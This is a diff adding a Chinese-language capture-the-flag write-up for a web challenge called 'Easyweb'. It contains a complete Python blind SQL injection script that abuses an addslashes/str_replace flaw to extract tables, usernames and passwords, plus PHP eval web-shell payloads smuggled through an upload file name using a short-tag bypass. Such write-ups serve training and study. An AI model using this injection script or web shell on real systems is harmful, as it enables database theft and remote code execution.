@@ -325,3 +325,202 @@ public function __call($func, $args) {//User::__destruct->FileList::__call,$func
 
 ![image-20210502002005139](image-20210502002005139.png)
 
+
+
+
+
+
+
+## Easyweb
+
+在`robots.txt`中有提示`Disallow: *.php.bak`,检查发现`image.php.bak`
+
+```php
+<?php
+include "config.php";
+
+$id=isset($_GET["id"])?$_GET["id"]:"1";
+$path=isset($_GET["path"])?$_GET["path"]:"";
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
+$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
+
+$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path="./" . $row["path"];
+header("Content-Type: image/jpeg");
+readfile($path);
+```
+
+`addslashes`单独使用没有问题,但是跟其他过滤方式搭配会出问题
+
+```php
+<?php
+$id='\0';
+$path="asdf";
+
+$id=addslashes($id);#\\0
+$path=addslashes($path);
+
+$id=str_replace(array("\\0","%00","\\'","'"),"",$id);#\\0->\
+$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
+var_dump("select * from images where id='{$id}' or path='{$path}'");
+#string(48) "select * from images where id='\' or path='asdf'"
+?>
+```
+
+`\' or path=`相当于`id`的值,而传递给`path`的值则会逃逸出来,成为sql语句中的一部分(注意将后面的`'`注释掉)
+
+```python
+import requests
+import time
+
+url = "http://70a48b5e-791b-433f-a85f-8666c6c9bad6.node3.buuoj.cn/image.php"
+
+'''
+#太tm慢了...,改二分
+for i in range(1, 65):
+    for j in range(30, 128):
+        payload = r"?id=\0&path= or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d-- " % (i, j)
+        r = requests.get(url + payload)
+        if len(r.text):
+            print(chr(j), end="")
+            break
+        time.sleep(0.25)
+'''
+
+
+# 懒得降耦合了,凑合用吧...
+
+def get_table_name_len():
+    for i in range(100):
+        payload = r"?id=\0&path= or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d-- " % i
+        r = requests.get(url + payload)
+        if len(r.text):
+            break
+        time.sleep(0.1)
+    return i
+
+
+def get_table_name(table_name_len):
+    for i in range(1, table_name_len + 1):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = r"?id=\0&path= or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))>%d-- " % (i, mid)
+            r = requests.get(url + payload)
+            if len(r.text):
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        print(chr(mid), end="")
+    print()
+
+
+def get_user_column_name_len():
+    for i in range(100):
+        payload = r"?id=\0&path= or length((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273))=%d-- " % i  # users转16进制为0x7573657273
+        r = requests.get(url + payload)
+        if len(r.text):
+            break
+        time.sleep(0.1)
+    return i
+
+
+def get_user_column_name(user_column_name_len):
+    for i in range(1, user_column_name_len + 1):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = r"?id=\0&path= or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),%d,1))>%d-- " % (i, mid)
+            r = requests.get(url + payload)
+            if len(r.text):
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        print(chr(mid), end="")
+    print()
+
+
+def get_username_len():
+    for i in range(100):
+        payload = r"?id=\0&path= or length((select group_concat(username) from users))=%d-- " % i
+        r = requests.get(url + payload)
+        if len(r.text):
+            break
+        time.sleep(0.1)
+    return i
+
+
+def get_username(username_len):
+    for i in range(1, username_len + 1):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = r"?id=\0&path= or ascii(substr((select group_concat(username) from users),%d,1))>%d-- " % (i, mid)
+            r = requests.get(url + payload)
+            if len(r.text):
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        print(chr(mid), end="")
+    print()
+
+
+def get_password_len():
+    for i in range(100):
+        payload = r"?id=\0&path= or length((select group_concat(password) from users))=%d-- " % i
+        r = requests.get(url + payload)
+        if len(r.text):
+            break
+        time.sleep(0.1)
+    return i
+
+
+def get_password(password_len):
+    for i in range(1, password_len + 1):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = r"?id=\0&path= or ascii(substr((select group_concat(password) from users),%d,1))>%d-- " % (i, mid)
+            r = requests.get(url + payload)
+            if len(r.text):
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        print(chr(mid), end="")
+    print()
+
+
+get_table_name(get_table_name_len())  # images,user
+get_user_column_name(get_user_column_name_len())  # username,password
+get_username(get_username_len())  # admin
+get_password(get_password_len())  # 动态变化 75c7a6fd1bb3332893c4
+```
+
+由于`' "`均被转义或过滤,因此使用16进制指代表名,登录后得到一个文件上传页面,上传文件后会提示该上传已被记录在某个php中
+
+`I logged the file name you uploaded to logs/upload.0ca4c33315730e25e114936e0838141d.log.php. LOL<script>setTimeout('location.href="user.php"',3000);</script>`
+
+打开该文件,发现其中记录了上传的文件名,将上传的文件名修改为`<?php @eval($_POST['a']);?>`,尝试上传,返回`You cant upload php file.`
+
+> 其检测机制为检测文件名中是否含有`php`,不区分大小写
+
+可以使用短标签绕过,上传文件名为`<?= @eval($_POST['a']);?>`,即可getshell
+
